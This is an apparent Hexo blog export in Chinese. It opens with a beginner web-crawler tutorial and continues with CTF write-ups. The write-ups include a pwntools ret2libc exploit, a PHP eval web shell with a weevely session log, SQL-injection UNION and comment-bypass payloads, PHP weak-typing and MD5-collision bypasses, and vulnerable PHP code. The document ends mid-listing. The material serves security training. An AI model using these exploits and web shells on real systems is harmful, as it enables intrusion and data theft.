    <content><![CDATA[<h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><h2 id="关于内容的思考"><a href="#关于内容的思考" class="headerlink" title="关于内容的思考"></a>关于内容的思考</h2><p>书里有两处遗漏</p><ol><li><p>正则匹配不当</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure><p>这里应该是/place/default/这样的格式，因为re.match只匹配开头串，前面重复的部分也要写上</p></li><li><p>在requests这里讲解的时候代码少了个return html</p></li></ol><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def download(url, user_agent='wswp', robots=None, num_retries=5, proxies=None):</span></span><br><span class="line"><span class="string">    print("Downloading:", url)</span></span><br><span class="line"><span class="string">    headers = &#123;'User-Agent': user_agent&#125;</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        resp = requests.get(url, headers=headers, proxies=proxies)</span></span><br><span class="line"><span class="string">        html = resp.text</span></span><br><span class="line"><span class="string">        # print(html)</span></span><br><span class="line"><span class="string">        if resp.status_code &gt;= 400:</span></span><br><span class="line"><span class="string">            print("Downloading error:", resp.text)</span></span><br><span class="line"><span class="string">            html = None</span></span><br><span class="line"><span class="string">            if num_retries and 500 &lt;= resp.status_code &lt; 600:</span></span><br><span class="line"><span class="string">                return download(url, num_retries - 1)</span></span><br><span class="line"><span class="string">    except requests.exceptions.RequestException as e:</span></span><br><span class="line"><span class="string">        print("Download error", e.reason)</span></span><br><span class="line"><span class="string">        html = None</span></span><br><span class="line"><span class="string">    return html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(url, user_agent=<span class="string">'wswp'</span>, robots=None, num_retries=<span class="number">5</span>,proxies = None)</span>:</span></span><br><span class="line">    print(<span class="string">"Downloading:"</span>, url)</span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, headers=headers, proxies = proxies)</span><br><span class="line">        html = resp.text</span><br><span class="line">        <span class="keyword">if</span> resp.status_code &gt; <span class="number">400</span>:</span><br><span class="line">            print(<span class="string">"Download error"</span>, resp.text)</span><br><span class="line">            html = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> num_retries <span class="keyword">and</span> <span class="number">500</span> &lt;= resp.status_code &lt; <span class="number">600</span>:</span><br><span class="line">                <span class="keyword">return</span> download(url,num_retries<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Download error"</span>, e.reason)</span><br><span class="line">        html = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_sitemap</span><span class="params">(url)</span>:</span></span><br><span class="line">    sitemap = download(url)</span><br><span class="line">    print(sitemap)</span><br><span class="line">    links = re.findall(<span class="string">r'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>, sitemap)</span><br><span class="line">    print(links)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        html = download(link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_errors = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_site</span><span class="params">(url, max_error=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">        pg_url = <span class="string">"&#123;&#125;&#123;&#125;"</span>.format(url, page)</span><br><span class="line">        html = download(pg_url)</span><br><span class="line">        <span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            num_errors += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num_errors == max_error:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links</span><span class="params">(html)</span>:</span></span><br><span class="line">    webpage_regex = re.compile(<span class="string">r'a href="(.*?)"&gt;'</span>)</span><br><span class="line">    <span class="keyword">return</span> webpage_regex.findall(html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> robotparser</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_robots_parser</span><span class="params">(robots_url)</span>:</span></span><br><span class="line">    rp = robotparser.RobotFileParser()</span><br><span class="line">    rp.set_url(<span class="string">'http://example.python-scraping.com/robots.txt'</span>)</span><br><span class="line">    rp.read()</span><br><span class="line">    <span class="keyword">return</span> rp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_craw</span><span class="params">(start_url, link_regex, robots_url = None, user_agent = <span class="string">'wswp'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> robots_url:</span><br><span class="line">        robots_url = <span class="string">'&#123;&#125;/robots.txt'</span>.format(start_url)</span><br><span class="line">    rp = get_robots_parser(robots_url)</span><br><span class="line">    craw_queue = [start_url]</span><br><span class="line">    seen = set(craw_queue)</span><br><span class="line">    <span class="keyword">while</span> craw_queue:</span><br><span class="line">        url = craw_queue.pop()</span><br><span class="line">        <span class="keyword">if</span> rp.can_fetch(user_agent,url):</span><br><span class="line">            html = download(url,user_agent=user_agent)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Blocked by robots.txt"</span>, url)</span><br><span class="line">            html = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> get_links(html):</span><br><span class="line">            <span class="keyword">if</span> re.match(link_regex, link):</span><br><span class="line">                abs_link = urljoin(start_url, link)</span><br><span class="line">                <span class="keyword">if</span> abs_link <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">                    seen.add(abs_link)</span><br><span class="line">                    craw_queue.append(abs_link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># craw_sitemap("http://example.python-scraping.com/sitemap.xml")</span></span><br><span class="line">    <span class="comment">#craw_site("http://example.python-scraping.com/view/-")</span></span><br><span class="line">    link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>链接爬取时需要关注重复链接</li><li>关注robots.txt</li><li>利用数据库id爬取网站</li><li>自己分析网页并善用正则匹配</li><li>requests库相对简单</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/3e78770/">https://noone-hub.github.io/posts/3e78770/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>tjctf2019比赛</title>
    <url>/posts/46708f4d/</url>
    <content><![CDATA[<h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;# � �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/46708f4d/">https://noone-hub.github.io/posts/46708f4d/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>随便做的练习</title>
    <url>/posts/8cd80461/</url>
    <content><![CDATA[<h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>刚看以为很复杂，后面发觉前面的都是校验，只要异或下就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List = [<span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x43</span>, <span class="number">0x7E</span>, <span class="number">0x61</span>, <span class="number">0x1F</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List)):</span><br><span class="line">    flag += chr(List[i]^(<span class="number">0x22</span>+i))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hi,%s welcome to shanxi~!\n"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的栈溢出，64位，开头ropgadget坏了，折腾了一小会，然后exp很简单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">'123.59.204.3'</span></span><br><span class="line">port = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400863</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    ret_addr = <span class="number">0x0000000000400776</span></span><br><span class="line">    offset = <span class="number">120</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"welcome to shanxi~!\n"</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/8cd80461/">https://noone-hub.github.io/posts/8cd80461/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全训练</title>
    <url>/posts/f605762/</url>
    <content><![CDATA[<h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9dXBsb2Fk" title="http://114.55.36.69:8009/index.php?url=upload">http://114.55.36.69:8009/index.php?url=upload<i class="fa fa-external-link"></i></span></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --> <?php
    @eval($_POST['south']);
    ?> <p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9cGhhcjovL3VwbG9hZC8xM2Q5ODM4OGZiZjdhMDM5N2RlODdlZTM2NTgzMGRmOC56aXAvdGVzdA==" title="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test<i class="fa fa-external-link"></i></span><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p><p>weevely generate<password><path></path></password></p><p>weevely generate test ./test.php<br>生成小马</p><p>然后压缩<br>zip test.zip test.php</p><p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1mbGFn" title="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag<i class="fa fa-external-link"></i></span></p><h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA0" title="http://114.55.36.69:8004">http://114.55.36.69:8004<i class="fa fa-external-link"></i></span></p><p>easy MD5 cracking</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure><p>没有md5?应该是只有部分代码</p><p>脑补一下剩下的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure><p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p><p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMDMyMzQ5OQ==" title="https://zhuanlan.zhihu.com/p/30323499">https://zhuanlan.zhihu.com/p/30323499<i class="fa fa-external-link"></i></span></p><p>data1[]=1 &amp;&amp; data2[]=2</p><p>flag{401cf19d304e557349fecda18110c138}</p><h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDEw" title="http://114.55.36.69:8010">http://114.55.36.69:8010<i class="fa fa-external-link"></i></span></p><p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p><p>burp</p><p>注入表名</p><p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()– &amp;number=5</p><p>注入得到列名</p><p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’– &amp;number=5</p><p>得到flag<br>word=1%’ union select 1,2,flag from admin– &amp;number=5</p><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDIy" title="http://114.55.36.69:8022">http://114.55.36.69:8022<i class="fa fa-external-link"></i></span></p><p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p><p>A.A[]=1</p><h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p><p>py读取二进制流在urlencode一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure><p>然后通过burp或者py都可以直接获得flag</p><p>这里用hackbar会变成二次url编码，然后会出问题</p><h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p><p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p><p>注释是c语言注释格式/* */ !和数字，这个数字不能太小</p><p>。。flag不对。。</p><h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDEx" title="http://114.55.36.69:8011">http://114.55.36.69:8011<i class="fa fa-external-link"></i></span><br>简单js执行命令即可</p><h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p><p>1de3ce6607a0f95as1861c4bbb3687b8</p><h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    